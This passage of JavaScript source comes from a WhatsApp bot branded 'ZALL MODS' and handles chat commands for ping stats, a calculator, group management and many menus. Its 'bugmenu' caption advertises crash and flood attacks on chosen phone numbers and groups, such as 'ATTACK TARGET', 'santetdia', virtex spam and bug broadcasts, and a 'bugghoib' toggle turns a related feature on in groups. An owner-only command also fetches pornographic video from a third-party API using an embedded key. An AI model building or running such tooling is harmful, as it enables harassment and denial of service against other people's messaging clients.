no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) throw sticBanLu(from)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
🌷 RESPONS  ${latensi.toFixed(4)}
🌷 AKTIF Selama : ${runtime(process.uptime())}
🌷 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
🔥 MEMORY NODEJS 🔥
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) m.reply(stdout)
if (stderr.trim()) m.reply(stderr)
}
}
break
//=================================================//
case 'kalkulator': case 'kal': {
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//=================================================//
case 'bokep':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
}
break
//=================================================//
case 'penjara':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
teks = `「 *Create Group* 」

_▸ Name : ${cret.subject}_
_▸ Owner : @${cret.owner.split("@")[0]}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_
https://chat.whatsapp.com/${response}
`
m.reply(teks)
break
//=================================================//
case 'antilink': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================//
case 'bugghoib': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Bug Ghoib di group ini')
} else {
let buttonsntnsfww = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, `ZALL MODS`, m)
}
}
break
//=================================================//
case 'cowner': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Succes del friends`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'getname': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//=================================================//

// # BATAS # \\

//=================================================//
case 'creator': case 'crator': {
if (isBan) throw sticBanLu(from)
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//
case 'owner': {
if (isBan) throw sticBanLu(from)
let buttons = [
{buttonId: `bugmenu`, buttonText: {displayText: 'BUG MENU'}, type: 1},
{buttonId: `creator`, buttonText: {displayText: 'OWNER'}, type: 1},
{buttonId: `soundmenu`, buttonText: {displayText: 'SOUND MENU'}, type: 1}
]
const buttonMessage = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*
◎ Owner : ZALL MODS

[ 🇲🇨 Ini adalah Bot Pribadi Tekan Link Di Bawah Untuk Bergabung ]`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'menu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : MASA PENJAJAHAN
┈╱▔╲▂╱╱╱╱▂╱▔╲┈┈
▕▔╲┈╱▔╲┈┈╱╲╱▔▏┈
▕▏┈▏╱▉╲┈┈╱▉╲▕▏┈
┈╲▃▏▔▔▔╲▂▂▂▕╱┈┈
┈┈┈▏┊┊┳┊╲▂╱┳▏┈┈
┈┈▕╲▂┊╰━━┻━╱┈┈┈
┈┈╱┈┈▔▔╲▂▂╱╲┈┈┈
╭━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━╮
┃╭─────────⩵꙰ཱི࿐
┃╰─ ⏤͟͟͞MENU NYA ─➤ ↶↷
╰━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 ALL MENU 〙
┣❏➥ BUGMENU
┣❏➥ SCRAPERIMAGE
┣❏➥ ASUPANMATA
┣❏➥ SCRAPCONVERT
┣❏➥ RANDOMSOUND
┣❏➥ NSFW
┣❏➥ SOUNDBOT
┣❏➥ FUNNMENU
┣❏➥ PRIMBONMENU
┣❏➥ ISLAMIYAH
┣❏➥ VOICECHANGER
┣❏➥ BERITANEWS
┣❏➥ CMDMENU
┣❏➥ SEARCHMENU
┣❏➥ GROUPMENU
┣❏➥ DOWNLOADMENU
┣❏➥ OWNERMENU
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
*NOTE*
🛡
contact me https://t.me/zallmods
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞  𝐉𝚫𝐍𝐒𝚵𝐍 𝐌𝚫𝐊𝚵𝐑`, contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@zallmods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'bugmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : MASA PENJAJAHAN
┈╱▔╲▂╱╱╱╱▂╱▔╲┈┈
▕▔╲┈╱▔╲┈┈╱╲╱▔▏┈
▕▏┈▏╱▉╲┈┈╱▉╲▕▏┈
┈╲▃▏▔▔▔╲▂▂▂▕╱┈┈
┈┈┈▏┊┊┳┊╲▂╱┳▏┈┈
┈┈▕╲▂┊╰━━┻━╱┈┈┈
┈┈╱┈┈▔▔╲▂▂╱╲┈┈┈
╭━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━╮
┃╭─────────⩵꙰ཱི࿐
┃╰─ ⏤͟͟͞BUG NYA ─➤ ↶↷
╰━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘  SPESIAL BUG  〙
│➳ afk { kasih reactions }
│➳ bugghoib [ on / off ]
│➳ jagoanom [ reply target ]
│➳ bugsange [ Harus Menjadi Admin ]
│➳ bugtiktok [ Link ] - Bug Sw
│➳ jadikatalog [ reply sticker ] jumlah
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 ATTACK TARGET 〙
│➳ ampas1 628xxx
│➳ santetdia 628xxx|10|10s
│➳ catalogpc 628xxx|10|10s 
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 ATTACK GROUP 〙
│⚠️ Ketik > m.chat (di group dulu)
│➳ ampas2 112674448xxx
│➳ santetgc  1237891xxxx|10|10s
│➳ cataloggc 1237891xxxx|10|10s 
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 VIRTEX SPAM 〙
│➳ virtext1 [ jumlah ]
│➳ virtext2 [ jumlah ]
│➳ virtext3 [ jumlah ]
│➳ virtext4 [ jumlah ]
│➳ virtext5 [ jumlah ]
│➳ virtext6 [ jumlah ]
│➳ virtext7 [ jumlah ]
│➳ virtext8 [ jumlah ]
│➳ virtext9 [ jumlah ]
│➳ virtext10 [ jumlah ] 
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 BUG SPAM 〙
│➳ 👄 [ jumlah ]
│➳ 👺 [ jumlah ]
│➳ 👽 [ jumlah ]
│➳ 💦 [ jumlah ]
│➳ 🤢 [ jumlah ]
│➳ 💩 [ jumlah ]
│➳ 👻 [ jumlah ]
│➳ 🥴 [ jumlah ]
│➳ 🦁 [ jumlah ]
│➳ 🔮 [ jumlah ]
│➳ ☣️ [ jumlah ]
│➳ 〽️ ️[ jumlah ]
│➳ 🕊 ️[ jumlah ]
│➳ 🐣 [ jumlah ]
│➳ 💸 [ jumlah ]
│➳ 🗿 [ jumlah ]
│➳ 😎 [ jumlah ]
│➳ 🤯 [ jumlah ]
│➳ 😡 [ jumlah ]
│➳ 🥶 [ jumlah ]
│➳ 👹 [ jumlah ]
│➳ 👿 [ jumlah ]
│➳ 🎃 [ jumlah ]
│➳ ☠️ [ jumlah ]
│➳ 🐯 [ jumlah ]
│➳ 🧀 [ jumlah ]
│➳ 🫑 [ jumlah ]
│➳ 🍆 [ jumlah ]
│➳ 🥑 [ jumlah ]
│➳ 🌽 [ jumlah ]
│➳ 🧅 [ jumlah ]
│➳ 🍠 [ jumlah ]
│➳ 🌶 [ jumlah ]
│➳ 🥕 [ jumlah ]
│➳ 🍅 [ jumlah ]
│➳ 🍋 [ jumlah ]
│➳ 🍈 [ jumlah ]
│➳ 🍏 [ jumlah ]
│➳ 🍐 [ jumlah ]
│➳ 🫒 [ jumlah ]
│➳ 🫐 [ jumlah ]
│➳ 🍇 [ jumlah ]
│➳ 🍌 [ jumlah ]
│➳ 🍍 [ jumlah ]
│➳ 🥝 [ jumlah ]
│➳ 🔥 [ jumlah ]
│➳ 💔 [ jumlah ]
│➳ 🌷 [ jumlah ]
│➳ 💎 [ jumlah ]
│➳ bugstik [ jumlah ]
│➳ bugie [ jumlah ]
│➳ buglokas [ jumlah ]
│➳ bugtod [ jumlah ]
│➳ bugbokep [ jumlah ]
│➳ buginvite [ jumlah ] Pc
│➳ ha [ jumlah ]
│➳ hi [ jumlah ]
│➳ hu [ jumlah ]
│➳ he [ jumlah ]
│➳ ba [ jumlah ]
│➳ be [ jumlah ]
│➳ bu [ jumlah ]
│➳ bi [ jumlah ]
│➳ ca [ jumlah ]
│➳ ci [ jumlah ]
│➳ cu [ jumlah ]
│➳ co [ jumlah ]
│➳ bug1 [ jumlah ]
│➳ bug2 [ jumlah ]
│➳ bug3 [ jumlah ]
│➳ bug4 [ jumlah ]
│➳ bug5 [ jumlah ]
│➳ bug6 [ jumlah ]
│➳ bug7 [ jumlah ]
│➳ poll [ jumlah ]
│➳ bugtag [ jumlah ]
│➳ inibug [ jumlah ]
│➳ buttonampas [ jumlah ]
│➳ hiya [ jumlah ]
│➳ lokas [ jumlah ]
│➳ catalog [ jumlah ]
│➳ docu [ jumlah ]
│➳ daca [ jumlah ]
│➳ duc [ jumlah ]
│➳ ducu [ jumlah ]
│➳ troli [ jumlah ]
│➳ troli2 [ jumlah ]
│➳ spam [ Reply Pesan ]
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 JADI BUG 〙
│➳ jadibug1 [ Video Jadi Audio ]
│➳ jadibug2 [ Video Jadi Mp3 ]
│➳ jadibug3 [ Audio Jadi Vn ]
│➳ jadibug4 [ Sticker Jadi Gambar ]
│➳ jadibug5 [ Gambar Jadi Once ] 
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘 BUG BROADCAST 〙
│➳ bugbcimage [ Bug image ]
│➳ bugbcvideo [ Bug Video ]
│➳ bugbc audio [ Bug Audio ]
│➳ bugbctext [ Bug Text ]
╰━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
*NOTE*
🛡
contact me https://t.me/zallmods
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞  𝐉𝚫𝐍𝐒𝚵𝐍 𝐌𝚫𝐊𝚵𝐑`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'bot': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
"description": ` - © ZALL MODS -

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ZALL MODS WE ARE NOT MASTOD`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'soundbot': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] soundbot* 
 
kal
ngakak
ketawa
awkwk
bang
nob
musik
mastah
slebew
cantik
kesel
ngeselin`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@zallmods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'funnmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] funnmenu* 
bagaimanakah
kapankah
apakah
bisakah
rate
wangy
gantengcek
cekganteng
cantikcek
cekcantik
sangecek
ceksange
gaycek
cekgay
lesbicek
halah
hilih
huluh
heleh
holoh
delttt]`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'primbonmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] primbonmenu* 
nomorhoki
 artimimpi
 artinama
 ramaljodoh
 ramaljodohbali
 suamiistri
 ramalcinta
 cocoknama
 pasangan
 jadiannikah
 sifatusaha
 rezeki
 pekerjaan
 nasib
 penyakit
 tarot
 fengshui
 haribaik
 harisangar
 harisial
 nagahari
 arahrezeki
 peruntungan
 weton
 karakter
 keberuntungan
 memancing
 masasubur
 zodiak
 shio`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'islamiyah': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] islamiyah* 
iqra
 hadist
 alquran
 juzamma
 tafsirsurah`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'beritanews': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] beritanews* 
merdeka-news
kontan-news 
cnbc-news
tribun-news
indozone-news
kompas-news
detik-news
daily-news
inews-news
okezone-news
sindo-news
tempo-news
antara-news
cnn-news
fajar-news `,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'groupmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Group Menu* 
linkgroup
 ephemeral [di group]
 setppgc /full [image]
 setppbot / full [image]
 setname [text]
 setdesc [text]
 group [option]
 editinfo [option]
 add @user
 kick @user
 ban [targer]
 hidetag [text]
 tagall [text]
 promote @user
 demote @user
 mute on / off
 getname
 translate
 kalkulator
 intro
 getpic
 penjara
 intro`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'voicechanger': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Voice Changer* 
bass
blown
deep
earrape
fast
fat
nightcore
reverse
robot
slow
tupai`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'asupanmata': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Asupan Mata* 
bokep`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'searchmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] Search Menu* 
gimage [query]
pinterest [query]
wallpaper [query]
wikimedia [query]
ringtone [query]
searchgroups [query]`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'scrapconvert': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] Scrap Convert* 
attp
ttp
toimage
sticker
emojimix
emojimix2
tovideo
togif
tourl
tovn
toonce
tomp3
toaudio
ebinary
dbinary
styletext
smeme
ss [url]`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'cmdmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] Cmd Menu* 
setcmd
listcmd
delcmd
lockcmd`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'downloadmenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] Download Menu* 
pinterestdl [url]
mediafire [url]`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'ownermenu': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Owner Menu* 
react [emoji]
chat [option]
join [link]
leave
block @user
unblock @user
bcText [text]
setexif
ban add
ping
owner
creator
delete
infochat
quoted
cowner add 628xx
listpc
listgc
listonline
speedtest`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'scraperimage': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Scraper Image* 
coffe
quotesanime
couple
wibu
loli
bully
waifu
cuddle
neko
cry
kiss
hug
lick
awoo
yeet
bite
lick
pat
kill
nom
poke
wink
bonk
glomp
smug
blush
wave
smile
highfive
cringe
dance
happy
handhold 
darkjoke
meme
meme2`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'randomsound': {
if (isBan) throw sticBanLu(from)
haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Sound Menu* 
sound1
sound2
sound3
sound4
sound5
sound6
sound7
sound8
sound9
sound10
sound11
sound12
sound13
sound14
sound15
sound16
sound17
sound18
sound19
sound20
sound21
sound22
sound23
sound24
sound25
sound26
sound27
sound28
sound29
sound30
sound31
sound32
sound33
sound34
sound35
sound36
sound37
sound38
sound39
sound40
sound41
sound42
sound43
sound44
sound45
sound46
sound47
sound48
sound49
sound50
sound51
sound52
sound53
sound54
sound55
sound56
sound57
sound58
sound59
sound60
sound61
sound62
sound63
sound64
sound65
sound66
sound67
sound68
sound69
sound70
sound71
sound72
sound73
sound74
sound75
sound76
sound77
sound78
sound79
sound80
sound81
sound82
sound83
sound84
sound85
sound86
sound87
sound88
sound89
sound90
sound91
sound92
sound93
sound94
sound95
sound96
sound97
sound98
sound99
sound100
sound101
sound102
sound103
sound104
sound105
sound106
sound107
sound108
sound109
sound110
sound111
sound112
sound113
sound114
sound115
sound116
sound117
sound118
sound119
sound120
sound121
sound122
sound123
sound124
sound125
sound126
sound127
sound128
